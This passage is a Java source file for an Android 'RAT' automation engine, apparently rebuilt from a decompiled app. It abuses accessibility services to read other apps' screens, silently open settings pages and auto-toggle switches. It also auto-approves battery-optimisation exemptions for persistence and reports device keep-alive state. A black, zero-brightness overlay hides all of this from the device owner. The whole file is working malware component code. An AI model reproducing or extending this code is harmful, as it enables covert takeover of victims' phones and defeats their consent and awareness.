package com.vendor.rat.auto.engine;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.CheckedResult;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.config.TextConfig;
import com.vendor.rat.helper.BlockViewHelper;
import com.vendor.rat.helper.StealthHelper;
import com.vendor.rat.helper.StealthIntent;
import com.vendor.rat.model.req.ListenWindow;
import com.vendor.rat.model.resp.PowerControlStateVO;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.SharedUtils;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 自动化引擎基类 (模块 02/03 核心)
 *
 * 基于逆向分析: o/c.java (~600 行)
 *
 * 对齐 Vendor APK 的完整实现:
 *   - WindowMatcher (ListenWindow): packageName + className + eventTypes
 *   - ReentrantLock 线程安全 (对应 f610o)
 *   - ConcurrentLinkedQueue 状态机 (对应 f609n)
 *   - AtomicBoolean running/finished + AtomicReference 根节点缓存
 *   - ScheduledExecutorService 定时任务 (对应 f611p)
 *   - 黑屏遮罩集成 (StealthHelper)
 *   - 进度追踪 (对应 helper/g.h())
 *   - T0() 200ms 粒度延迟
 *   - 静默 Intent 启动 (StealthIntent)
 *   - 生命周期: start/finish/destroy 对应 逆向 T()/Z()/X()/d()
 *   - G() 激活根节点, Q() 获取滚动视图, k() 获取根节点 UiNode
 */
public abstract class AutoEngine {

    private static final String TAG = "AutoEngine";

    // ============ 窗口匹配 (ListenWindow) ============

    public static class WindowMatcher {
        private final String packageName;
        private final String className;
        private final Set<Integer> eventTypes;

        public WindowMatcher(String packageName) {
            this(packageName, null);
        }

        public WindowMatcher(String packageName, String className) {
            this.packageName = packageName;
            this.className = className;
            this.eventTypes = new HashSet<>();
        }

        public WindowMatcher addEventType(int eventType) {
            this.eventTypes.add(eventType);
            return this;
        }

        public boolean matches(String pkg, String cls, int eventType) {
            if (packageName != null && !packageName.equals(pkg)) return false;
            if (className != null && !className.isEmpty() && !className.equals(cls)) {
                return false;
            }
            if (!eventTypes.isEmpty() && !eventTypes.contains(eventType)) {
                return false;
            }
            return true;
        }

        public String getPackageName() { return packageName; }
        public String getClassName() { return className; }
        public Set<Integer> getEventTypes() { return eventTypes; }
    }

    // ============ 字段 — 对齐逆向 o/c.java ============

    /** 监听的窗口列表 — 对应逆向 LinkedList<ListenWindow> */
    private final List<WindowMatcher> matchWindows = new ArrayList<>();

    /** 默认监听的包名 */
    private final String primaryPackage;

    /** 引擎名称 */
    private final String engineName;

    /** 运行状态 — 对应逆向 AtomicBoolean */
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicBoolean finished = new AtomicBoolean(false);

    /** 线程锁 — 对应逆向 f610o ReentrantLock */
    protected final ReentrantLock lock = new ReentrantLock();

    /** 状态队列 — 对应逆向 f609n ConcurrentLinkedQueue */
    protected final ConcurrentLinkedQueue<String> stateQueue = new ConcurrentLinkedQueue<>();

    /** 定时任务调度器 — 对应逆向 f611p */
    protected final ScheduledExecutorService scheduler =
        Executors.newSingleThreadScheduledExecutor();

    /** 根节点缓存 — 对应逆向 f221s AtomicReference */
    protected final AtomicReference<UiNode> cachedRoot = new AtomicReference<>(null);

    /** 当前匹配的窗口信息 */
    protected volatile String currentPackage = "";
    protected volatile String currentClassName = "";

    // ============ 构造器 ============

    protected AutoEngine(String primaryPackage) {
        this.primaryPackage = primaryPackage;
        this.engineName = getClass().getSimpleName();
    }

    protected AutoEngine(List<WindowMatcher> matchers, String primaryPackage) {
        this.primaryPackage = primaryPackage;
        this.engineName = getClass().getSimpleName();
        if (matchers != null) {
            this.matchWindows.addAll(matchers);
        }
    }

    // ============ 窗口匹配 ============

    protected void addWindowMatcher(WindowMatcher matcher) {
        matchWindows.add(matcher);
    }

    public boolean matchWindow(String packageName, String className) {
        return matchWindow(packageName, className, 0);
    }

    public boolean matchWindow(String packageName, String className, int eventType) {
        if (!matchWindows.isEmpty()) {
            for (WindowMatcher matcher : matchWindows) {
                if (matcher.matches(packageName, className, eventType)) {
                    return true;
                }
            }
            return false;
        }
        return primaryPackage != null && primaryPackage.equals(packageName);
    }

    // ============ 事件处理 — 对齐逆向 u() ============

    /**
     * 无障碍事件处理入口
     * 对应逆向: u(AccessibilityEvent, String, String)
     * 子类重写此方法实现状态机逻辑
     */
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        currentPackage = packageName;
        currentClassName = className;
        // 默认实现: 调用 onWindowMatched
        onWindowMatched(packageName, className, event);
    }

    /**
     * 窗口匹配成功后的回调 (简化版)
     */
    public abstract void onWindowMatched(String packageName, String className,
                                         AccessibilityEvent event);

    /**
     * 执行引擎主逻辑
     */
    public abstract void execute();

    // ============ 生命周期 — 对齐逆向 T()/Z()/X()/d() ============

    /**
     * 启动引擎
     */
    public void start() {
        if (running.compareAndSet(false, true)) {
            finished.set(false);
            stateQueue.clear();
            Log.i(TAG, engineName + " started");
            execute();
        }
    }

    /**
     * 检查是否已完成
     * 对应逆向: T()
     */
    public boolean isCompleted() {
        return finished.get();
    }

    /**
     * 结束引擎 — 委托给 Z()
     */
    public void finish() {
        Z();
    }

    /**
     * 销毁引擎，清理资源 — 对应逆向: d()
     */
    public void destroy() {
        finish();
        scheduler.shutdownNow();
        Log.i(TAG, engineName + " destroyed");
    }

    // ============ 状态查询 ============

    public boolean isFinished() { return finished.get(); }
    public boolean isRunning() { return running.get(); }
    public String getEngineName() { return engineName; }
    public String getPrimaryPackage() { return primaryPackage; }

    // ============ 根节点操作 — 对齐逆向 G()/k()/Q()/R() ============

    /**
     * 激活根节点 (刷新缓存)
     * 对应逆向: G()
     */
    protected void activateRoot() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service == null) return;
        AccessibilityNodeInfo root = service.getRootNode();
        if (root != null) {
            cachedRoot.set(new UiNode(root));
        }
        log("activateRoot complete");
    }

    /**
     * 获取根节点 UiNode (使用缓存)
     * 对应逆向: k()
     */
    protected UiNode k() {
        UiNode cached = cachedRoot.get();
        if (cached != null) return cached;
        return getRootNode();
    }

    /**
     * 获取当前界面根节点 (不使用缓存)
     * ADAPT: 遮罩覆盖时 getRootInActiveWindow() 可能返回遮罩 View 树
     * 需要遍历所有窗口找到目标应用窗口
     */
    protected UiNode getRootNode() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service == null) return null;

        // 优先从 windows 列表获取目标包名的根节点
        try {
            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = service.getWindows();
            if (windows != null) {
                for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
                    if (w == null) continue;
                    AccessibilityNodeInfo wRoot = w.getRoot();
                    if (wRoot == null) continue;
                    CharSequence pkg = wRoot.getPackageName();
                    Log.d(TAG, "getRootNode window: type=" + w.getType()
                        + " pkg=" + pkg + " active=" + w.isActive()
                        + " title=" + w.getTitle());
                    // 跳过自身包名的窗口 (遮罩)
                    if (pkg != null && pkg.toString().equals(service.getPackageName())) {
                        continue;
                    }
                    // 优先选择 TYPE_APPLICATION (1) 窗口
                    if (w.getType() == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION) {
                        wRoot = MyAccessibilityService.m0(wRoot);
                        UiNode node = new UiNode(wRoot);
                        cachedRoot.set(node);
                        return node;
                    }
                }
                // fallback: 任何非自身窗口
                for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
                    if (w == null) continue;
                    AccessibilityNodeInfo wRoot = w.getRoot();
                    if (wRoot == null) continue;
                    CharSequence pkg = wRoot.getPackageName();
                    if (pkg != null && pkg.toString().equals(service.getPackageName())) {
                        continue;
                    }
                    wRoot = MyAccessibilityService.m0(wRoot);
                    UiNode node = new UiNode(wRoot);
                    cachedRoot.set(node);
                    return node;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "getRootNode windows error", e);
        }

        // fallback: 使用默认方式
        AccessibilityNodeInfo root = service.getRootNode();
        if (root != null) {
            Log.d(TAG, "getRootNode fallback: pkg=" + root.getPackageName());
            UiNode node = new UiNode(root);
            cachedRoot.set(node);
            return node;
        }
        return null;
    }

    /**
     * 获取可滚动节点
     * 对应逆向: Q() — 查找第一个 scrollable 节点
     */
    protected UiNode getScrollableNode() {
        UiNode root = getRootNode();
        if (root == null) return null;
        return root.findOneByCombine(CombineFilter.scrollable());
    }

    // ============ 状态机操作 ============

    /**
     * 添加状态 (互斥: 先移除其他状态)
     * 对应逆向: ConcurrentLinkedQueue 操作模式
     */
    protected boolean enterState(String state, String... removeStates) {
        for (String s : removeStates) {
            stateQueue.remove(s);
        }
        if (!stateQueue.contains(state)) {
            stateQueue.add(state);
            return true;
        }
        return false;
    }

    /**
     * 检查是否在指定状态
     */
    protected boolean inState(String state) {
        return stateQueue.contains(state);
    }

    /**
     * 移除状态
     */
    protected void exitState(String state) {
        stateQueue.remove(state);
    }

    // ============ 全局操作 ============

    protected boolean performBack() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service == null) return false;
        return service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }

    protected boolean performHome() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service == null) return false;
        return service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    protected boolean performNotifications() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service == null) return false;
        return service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
    }

    // ============ 隐身操作 — 对齐逆向 helper/g.java ============

    /**
     * 显示黑屏遮罩
     */
    protected void showBlackScreen(boolean zeroBrightness) {
        Context context = getContext();
        if (context != null) {
            StealthHelper.showBlackOverlay(context, zeroBrightness);
        }
    }

    /**
     * 移除黑屏遮罩
     */
    protected void removeBlackScreen() {
        Context context = getContext();
        if (context != null) {
            StealthHelper.removeBlackOverlay(context);
        }
    }

    /**
     * 静默启动 Activity
     * 对应逆向: utils/g.java A0()
     */
    protected void startSilent(String packageName, String className) {
        Context context = getContext();
        if (context != null) {
            StealthIntent.startSilent(context, packageName, className);
        }
    }

    // ============ 延迟控制 — 对齐逆向 T0() ============

    /**
     * 200ms 粒度延迟
     * 对应逆向: com.guard.wallet.utils.g.T0(units)
     * T0(1)=200ms, T0(5)=1s, T0(10)=2s
     */
    protected static void T0(int units) {
        StealthIntent.T0(units);
    }

    /**
     * 线程休眠 (毫秒)
     */
    protected static void sleep(long millis) {
        StealthIntent.sleep(millis);
    }

    // ============ 进度追踪 ============

    /**
     * 更新进度
     * 对应逆向: com.guard.wallet.helper.g.h(progress)
     */
    protected void updateProgress(int progress) {
        StealthHelper.updateProgress(progress);
    }

    // ============ 配置文本 ============

    /**
     * 获取配置文本列表
     * 对应逆向: com.guard.wallet.utils.f.b("KEY")
     */
    protected List<String> getConfigTexts(String key) {
        return TextConfig.getInstance().getTexts(key);
    }

    /**
     * 获取第一个配置文本
     */
    protected String getConfigText(String key) {
        return TextConfig.getInstance().getFirst(key);
    }

    /**
     * 构建多文本 OR 匹配过滤器
     * 对应逆向: b.v("KEY", ...) 模式
     */
    protected CombineFilter buildTextViewFilter(String configKey) {
        List<String> texts = getConfigTexts(configKey);
        if (texts == null || texts.isEmpty()) return null;

        NodeFilter[] filters = new NodeFilter[texts.size()];
        for (int i = 0; i < texts.size(); i++) {
            filters[i] = CombineFilter.textView(texts.get(i));
        }
        return CombineFilter.or(filters);
    }

    // ============ 工具方法 ============

    protected Context getContext() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        return service != null ? service.getApplicationContext() : null;
    }

    protected void log(String message) {
        Log.d(TAG + "/" + engineName, message);
    }

    protected void logError(String message) {
        Log.e(TAG + "/" + engineName, message);
    }

    protected void logError(String message, Throwable t) {
        Log.e(TAG + "/" + engineName, message, t);
    }

    /**
     * 等待窗口出现
     */
    protected boolean waitForWindow(int maxWaitSeconds) {
        for (int i = 0; i < maxWaitSeconds * 2; i++) {
            UiNode root = getRootNode();
            if (root != null) return true;
            sleep(500);
        }
        return false;
    }

    /**
     * 等待并查找控件
     */
    protected UiNode waitAndFind(NodeFilter filter, int maxRetries, long retryDelayMs) {
        for (int i = 0; i < maxRetries; i++) {
            UiNode root = getRootNode();
            if (root != null) {
                UiNode found = root.findOneByCombine(filter);
                if (found != null) return found;
            }
            sleep(retryDelayMs);
        }
        return null;
    }

    /**
     * 检查窗口是否匹配指定的 WindowMatcher 列表
     * 对应逆向: q(LinkedList) 方法
     */
    protected boolean matchesAny(List<WindowMatcher> matchers) {
        if (matchers == null || matchers.isEmpty()) return false;
        for (WindowMatcher matcher : matchers) {
            if (matcher.matches(currentPackage, currentClassName, 0)) {
                return true;
            }
        }
        return false;
    }

    // ============ Vendor c.java 方法 — 厂商引擎依赖 ============

    /**
     * 阻塞等待指定窗口出现
     * 对应逆向: c.q(LinkedList<ListenWindow>)
     * 厂商引擎核心方法: 导航到设置页面后等待目标窗口加载
     *
     * @param matchers 目标窗口列表 (任一匹配即返回 true)
     * @return true=窗口已出现, false=超时
     */
    protected boolean waitForWindowMatch(List<WindowMatcher> matchers) {
        return waitForWindowMatch(matchers, 15); // 默认 15 秒超时
    }

    protected boolean waitForWindowMatch(List<WindowMatcher> matchers, int timeoutSeconds) {
        if (matchers == null || matchers.isEmpty()) return false;
        for (int i = 0; i < timeoutSeconds * 5; i++) { // 200ms 间隔
            // 检查当前窗口
            String pkg = currentPackage;
            String cls = currentClassName;
            // 也从 MyAccessibilityService 获取最新状态
            if (MyAccessibilityService.P() != null) {
                String latestPkg = MyAccessibilityService.N();
                String latestCls = MyAccessibilityService.getCurrentWindowClass();
                if (latestPkg != null) pkg = latestPkg;
                if (latestCls != null) cls = latestCls;
            }
            for (WindowMatcher matcher : matchers) {
                if (matcher.getPackageName().equals(pkg)) {
                    if (matcher.getClassName() == null || matcher.getClassName().isEmpty()
                            || matcher.getClassName().equals(cls)) {
                        log("窗口匹配成功: " + pkg + "/" + cls);
                        return true;
                    }
                }
            }
            sleep(200);
        }
        log("等待窗口超时");
        return false;
    }

    /**
     * 激活根节点 (带重试)
     * 对应逆向: c.G() — 多次尝试获取根节点
     */
    protected void G() {
        for (int i = 0; i < 5; i++) {
            activateRoot();
            if (cachedRoot.get() != null) return;
            sleep(200);
        }
        log("G() 激活根节点失败");
    }

    /**
     * 获取可滚动视图
     * 对应逆向: c.Q() — 从根节点查找 scrollable 节点
     */
    protected UiNode Q() {
        return getScrollableNode();
    }

    /**
     * 检查是否已完成
     * 对应逆向: c.T()
     */
    protected boolean T() {
        return finished.get();
    }

    /**
     * 暂停引擎事件处理
     * 对应逆向: c.X() 行 737-739
     * vendor: this.q.set(true) — 只设暂停标志，不是 performHome()!
     */
    protected void X() {
        MyAccessibilityService service = MyAccessibilityService.getInstance();
        if (service != null) {
            service.pauseProxy();
        }
    }

    /**
     * 上报保活状态
     * 对应逆向: c.t0()
     */
    protected void t0() {
        try {
            PowerControlStateVO state = new PowerControlStateVO();
            state.setPackageName(primaryPackage);
            String deviceId = com.vendor.rat.network.NetworkManager.getInstance().getDeviceId();
            if (deviceId != null && !deviceId.isEmpty()) {
                state.setDeviceId(deviceId);
            }
            reportPowerControlState(state);
            log("t0() 上报保活状态: " + state);
        } catch (Exception e) {
            logError("t0() error", e);
        }
    }

    protected void reportPowerControlState(PowerControlStateVO state) {
        SharedUtils.savePowerControlState(state);
    }

    /**
     * 完成并清理 — 对齐 vendor o/n.java Z() 行 157-184
     *
     * vendor 流程:
     *   1. g.h(100) — 进度条设为100
     *   2. X() — this.q.set(true) 暂停事件处理 (不是 HOME!)
     *   3. MyAccessibilityService.P().x() — 清理无障碍缓存
     *   4. t0() — 上报保活状态
     *   5. scheduler.shutdownNow()
     *   6. stateQueue.clear()
     *   7. T0(5) — 等待 1 秒
     *   8. g.c() — 移除遮罩 (内部: GLOBAL_ACTION_RECENTS → sleep(1s) → removeView)
     *   9. c.W() — offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK")
     *  10. d() — 销毁
     *
     * 关键: vendor g.d() 在 removeView 之前执行 RECENTS:
     *   F0(8) = GLOBAL_ACTION_RECENTS → 遮罩还在时把 app task 带到前台
     *   T0(5) = sleep 1s → 等待 RECENTS 动画完成
     *   removeViewImmediate → 移除遮罩，露出 app 界面
     */
    protected void Z() {
        if (lock.tryLock()) {
            try {
                if (!T()) {
                    log("准备结束自动化引擎");

                    // 1. vendor: g.h(100) — 进度条 100%
                    StealthHelper.updateProgress(100);

                    // 2. vendor: X() — 暂停事件处理 (不是 HOME!)
                    X();

                    // 3. vendor: MyAccessibilityService.P().x() — 清理缓存
                    MyAccessibilityService service = MyAccessibilityService.getInstance();
                    if (service != null) {
                        service.H(true, true);
                    }

                    // 4. vendor: t0() — 上报保活状态
                    t0();

                    // 5. vendor: scheduler.shutdownNow()
                    scheduler.shutdownNow();

                    // 6. vendor: stateQueue.clear()
                    stateQueue.clear();
                    cachedRoot.set(null);

                    // 7. vendor: T0(5) — 等待 1 秒
                    T0(5);

                    // 8. vendor: g.c() — 移除遮罩
                    // g.c() 内部调用 g.d(), g.d() 的精确流程:
                    //   a) 恢复亮度
                    //   b) F0(8) = GLOBAL_ACTION_RECENTS (遮罩还在，用户看不到切换)
                    //   c) T0(5) = sleep 1s (等待 RECENTS 动画把 app 带到前台)
                    //   d) removeViewImmediate (移除遮罩，露出 app)
                    BlockViewHelper.removeWithDestroy();

                    log("已结束自动化引擎");

                    // 9. vendor: c.W() — 通知策略线程
                    if (com.vendor.rat.MainApplication.getInstance() != null) {
                        com.vendor.rat.MainApplication.getInstance()
                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                    }

                    // 10. 标记完成 + 恢复事件处理
                    finished.set(true);
                    running.set(false);
                    if (service != null) {
                        service.resumeProxy();
                    }
                }
            } catch (Exception e) {
                logError("Z() error", e);
            } finally {
                lock.unlock();
            }
        }
    }

    /**
     * 静默启动设置页面
     * 对应逆向: 厂商引擎中 g.d1(pkg, cls) 调用
     */
    protected void launchSettings(String packageName, String className) {
        try {
            Context context = getContext();
            if (context == null) return;
            android.content.Intent intent = new android.content.Intent();
            intent.setComponent(new android.content.ComponentName(packageName, className));
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(intent);
            log("启动设置: " + packageName + "/" + className);
        } catch (Exception e) {
            logError("launchSettings error", e);
        }
    }

    // ============ Switch/CheckBox 操作 — 对齐 vendor o/c.java ============

    /**
     * CompoundButton 查找+点击+验证
     * 对应 vendor: o/c.java P() 行 223-309
     *
     * 逻辑:
     *   1. 构建 className=CompoundButton 过滤器
     *   2. 从 target 向上遍历 parent (最多 2 层) 查找
     *   3. 如果 checked=false: click() → T0(1)+refresh 重试最多 5 次
     *   4. 如果仍 unchecked: findParentUtilCombine(clickableFilter) → click
     *   5. 返回 CheckedResult
     */
    public static CheckedResult P(UiNode target) {
        CheckedResult result = new CheckedResult();
        try {
            // vendor: className == android.widget.CompoundButton
            NodeFilter compoundButtonFilter = com.vendor.rat.auto.condition.StringCondition
                    .className("android.widget.CompoundButton");

            // 从 target 向上遍历 parent (最多 2 层)
            UiNode node = null;
            UiNode current = target;
            int depth = 0;
            while (current != null && node == null && depth <= 2) {
                node = current.findOneByCombine(compoundButtonFilter);
                if (node == null) {
                    current = current.parent();
                }
                depth++;
            }

            if (node == null) return result;

            boolean checked = node.checked();
            int retries = 5;

            if (!checked) {
                // 先尝试直接 click
                if (node.click()) {
                    result.setClicked(true);
                    node.refresh();
                    checked = node.checked();
                }
                // vendor c.java:265-271: T0(1) + refresh 循环
                while (retries > 0 && !checked) {
                    sleep(200); // T0(1) = 200ms
                    node.refresh();
                    checked = node.checked();
                    retries--;
                }
            }

            if (!checked) {
                // vendor c.java:280-286: findParentUtilCombine(L()) 查找 clickable 父节点
                UiNode clickableParent = node.findParentUtilCombine(
                        CombineFilter.clickable());
                if (clickableParent != null && clickableParent.click()) {
                    result.setClicked(true);
                    node.refresh();
                    checked = node.checked();
                    // 再次重试验证
                    retries = 5;
                    while (retries > 0 && !checked) {
                        sleep(200);
                        node.refresh();
                        checked = node.checked();
                        retries--;
                    }
                }
            }

            result.setChecked(checked);
        } catch (Exception e) {
            Log.e(TAG, "P() error", e);
        }
        return result;
    }

    /**
     * Switch/CheckBox OR 查找+点击+验证
     * 对应 vendor: o/c.java O() 行 488-559
     *
     * ADAPT: vendor 用 CombineFiltersWithOr 数据类, replica 用 NodeFilter varargs
     */
    public CheckedResult O(UiNode target) {
        CheckedResult result = new CheckedResult();
        try {
            // vendor: CombineFiltersWithOr(Switch, CheckBox)
            NodeFilter switchFilter = CombineFilter.switchWidget();
            NodeFilter checkBoxFilter = CombineFilter.checkBox();

            // 从 target 向上遍历 parent (最多 2 层)
            UiNode node = null;
            UiNode current = target;
            int depth = 0;
            while (current != null && node == null && depth <= 2) {
                node = current.findOneByOperateOr(switchFilter, checkBoxFilter);
                if (node == null) {
                    current = current.parent();
                }
                depth++;
            }

            if (node == null) return result;

            boolean checked = node.checked();

            // vendor c.java:541-551: 循环 click+T0(5)+refresh (最多 5 次)
            int tries = 0;
            while (!checked && tries < 5) {
                node.click();
                result.setClicked(true);
                sleep(1000); // T0(5) = 1s
                node.refresh();
                checked = node.checked();
                tries++;
            }

            result.setChecked(checked);
        } catch (Exception e) {
            Log.e(TAG, "O() error", e);
        }
        return result;
    }

    /**
     * Switch 坐标点击+验证 (华为特有)
     * 对应 vendor: o/c.java R() 行 654-731
     *
     * 逻辑: 找 Switch → boundsInScreen.right-50 + centerInScreen.y → tapAtCoordinate
     */
    public CheckedResult R(UiNode target, int retries) {
        CheckedResult result = new CheckedResult();
        try {
            NodeFilter switchFilter = CombineFilter.switchWidget();

            // 从 target 向上遍历 parent (最多 2 层)
            UiNode node = null;
            UiNode current = target;
            int depth = 0;
            while (current != null && node == null && depth <= 2) {
                node = current.findOneByCombine(switchFilter);
                if (node == null) {
                    current = current.parent();
                }
                depth++;
            }

            if (node == null) return result;

            boolean checked = node.checked();
            // vendor c.java:678-680: right-50, centerInScreen.y
            android.graphics.Rect bounds = node.boundsInScreen();
            com.vendor.rat.auto.entity.Point center = node.centerInScreen();
            int clickX = bounds.right - 50;
            int clickY = (int) center.getY();

            if (!checked) {
                // vendor c.java:686-690: g.s(clickX, clickY) 坐标点击
                if (com.vendor.rat.utils.MiscUtils.tapAtCoordinate(clickX, clickY)) {
                    result.setClicked(true);
                    // vendor c.java:691-694: 刷新根节点 → 重新查找 → 验证
                    activateRoot();
                    UiNode refreshedNode = current != null ?
                            current.findOneByCombine(switchFilter) : null;
                    if (refreshedNode != null) {
                        checked = refreshedNode.checked();
                        node = refreshedNode;
                    }
                }
                // vendor c.java:696-702: retry loop
                while (retries > 0 && !checked) {
                    sleep(200); // T0(1)
                    if (current != null) {
                        UiNode retryNode = current.findOneByCombine(switchFilter);
                        if (retryNode != null) {
                            checked = retryNode.checked();
                            node = retryNode;
                        }
                    }
                    retries--;
                }
            }

            // vendor c.java:704-711: fallback to clickable parent
            if (!checked) {
                UiNode clickableParent = node.findParentUtilCombine(
                        CombineFilter.clickable());
                if (clickableParent != null && clickableParent.click()) {
                    result.setClicked(true);
                    node.refresh();
                    checked = node.checked();
                    int fallbackRetries = 5;
                    while (fallbackRetries > 0 && !checked) {
                        sleep(200);
                        node.refresh();
                        checked = node.checked();
                        fallbackRetries--;
                    }
                }
            }

            result.setChecked(checked);
        } catch (Exception e) {
            Log.e(TAG, "R() error", e);
        }
        return result;
    }

    /**
     * Switch 坐标点击变体 (简化版, 无 retry/fallback)
     * 对应 vendor: o/c.java S() 行 334-382
     *
     * 逻辑: 找 Switch → right-80 + centerY → tapAtCoordinate → T0(5) 等待
     */
    public static CheckedResult S(UiNode target) {
        CheckedResult result = new CheckedResult();
        try {
            NodeFilter switchFilter = CombineFilter.switchWidget();

            // 从 target 向上遍历 parent (最多 2 层)
            UiNode node = null;
            UiNode current = target;
            int depth = 0;
            while (current != null && node == null && depth <= 2) {
                node = current.findOneByCombine(switchFilter);
                if (node == null) {
                    current = current.parent();
                }
                depth++;
            }

            if (node == null) return result;

            result.setChecked(node.checked());
            // vendor c.java:358-359: right + (-80), centerInScreen.y
            android.graphics.Rect bounds = node.boundsInScreen();
            com.vendor.rat.auto.entity.Point center = node.centerInScreen();
            int clickX = bounds.right - 80;
            int clickY = (int) center.getY();

            if (!result.isChecked()) {
                if (com.vendor.rat.utils.MiscUtils.tapAtCoordinate(clickX, clickY)) {
                    sleep(1000); // T0(5) = 1s
                    result.setClicked(true);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "S() error", e);
        }
        return result;
    }

    // ============ ListenWindow 匹配 — 对齐 vendor o/e.java ============

    /**
     * 单个 ListenWindow 匹配检查 (matchs + dismiss)
     * 对应 vendor: o/e.java p() 行 695-719
     *
     * @param lw   目标 ListenWindow (含 matchs/dismiss CombineFilter 列表)
     * @param root 当前界面根节点
     * @return true=匹配成功 (matchs 全通过 + dismiss 全不通过)
     */
    protected boolean matchListenWindow(ListenWindow lw, UiNode root) {
        try {
            // vendor e.java:699-704: matchs 全部通过 (AND)
            List<CombineFilter> matchs = lw.getMatchs();
            if (matchs != null && !matchs.isEmpty() && root != null) {
                for (CombineFilter filter : matchs) {
                    if (root.findOneByCombine(filter) == null) {
                        return false;
                    }
                }
            }

            // vendor e.java:709-713: dismiss 全部不通过 (NOT ANY)
            List<CombineFilter> dismiss = lw.getDismiss();
            if (dismiss != null && !dismiss.isEmpty() && root != null) {
                for (CombineFilter filter : dismiss) {
                    if (root.findOneByCombine(filter) != null) {
                        return false;
                    }
                }
            }

            return true;
        } catch (Exception e) {
            Log.e(TAG, "matchListenWindow error", e);
            return true; // vendor: 异常时默认允许
        }
    }

    /**
     * 批量 ListenWindow 匹配
     * 对应 vendor: o/e.java q() 行 727-807
     *
     * 逻辑: 遍历列表, 用 currentPackage/currentClassName 比较 pkg/cls,
     *        匹配后检查 matchs/dismiss, 任一匹配即返回 true
     */
    protected boolean matchListenWindows(java.util.List<ListenWindow> windows) {
        if (windows == null || windows.isEmpty()) return false;
        try {
            // vendor e.java:735: 刷新根节点
            UiNode root = cachedRoot.get();
            if (root != null) root.refresh();

            for (ListenWindow lw : windows) {
                // vendor e.java:740-745: 比较 packageName
                String lwPkg = lw.getPackageName();
                String lwCls = lw.getClassName();

                if (lwPkg != null && !lwPkg.equals(currentPackage)) {
                    continue;
                }

                // vendor e.java:746-750: 比较 className (null = 任意)
                if (lwCls != null && !lwCls.isEmpty() && !lwCls.equals(currentClassName)) {
                    continue;
                }

                // vendor e.java:752-770: 检查 matchs + dismiss
                if (matchListenWindow(lw, root != null ? root : getRootNode())) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "matchListenWindows error", e);
            return false;
        }
    }

    // ============ 电池优化对话框 — 对齐 vendor o/c.java ============

    /**
     * 构建电池优化对话框 ListenWindow
     * 对应 vendor: o/c.java J() 行 68-72
     */
    public static ListenWindow buildBatteryDialogWindow() {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.app.Dialog");
        HashSet<Integer> eventTypes = new HashSet<>();
        eventTypes.add(32);    // TYPE_WINDOW_CONTENT_CHANGED
        eventTypes.add(16384); // TYPE_VIEW_SCROLLED
        lw.setEventTypes(eventTypes);
        return lw;
    }

    /**
     * 构建"允许"按钮过滤器 (OR: button1 | btn_positive)
     * 对应 vendor: o/c.java I() 行 55-66
     * ADAPT: vendor 返回 CombineFiltersWithOr, replica 返回 NodeFilter[]
     */
    public static NodeFilter[] buildBatteryAllowButtonFilters() {
        // Filter1: className=Button + id=android:id/button1
        NodeFilter filter1 = CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("android:id/button1")
        );
        // Filter2: className=Button + id=com.android.settings:id/btn_positive
        NodeFilter filter2 = CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("com.android.settings:id/btn_positive")
        );
        return new NodeFilter[]{filter1, filter2};
    }

    /**
     * 构建取消按钮过滤器
     * 对应 vendor: o/c.java N() 行 119-123
     */
    public static CombineFilter buildCancelButtonFilter() {
        return CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("android:id/button1")
        );
    }

    /**
     * 检查并处理电池优化对话框
     * 对应 vendor: o/c.java u() 行 762-801
     * 在 onAccessibilityEvent 中调用
     */
    protected void checkBatteryOptimizationDialog() {
        try {
            ListenWindow dialogWindow = buildBatteryDialogWindow();
            if (matchListenWindows(java.util.Collections.singletonList(dialogWindow))) {
                Log.d(TAG, "已进入是否允许忽略电池优化窗口");
                if (!stateQueue.contains("keepInBatteryUnRestricted")) {
                    stateQueue.add("keepInBatteryUnRestricted");
                    // vendor: thread.l.c(new o.a(this, 0), this.c)
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() {
                            dismissBatteryOptimizationDialog();
                        }
                    });
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "checkBatteryOptimizationDialog error", e);
        }
    }

    /**
     * 点击电池优化对话框的"允许"按钮
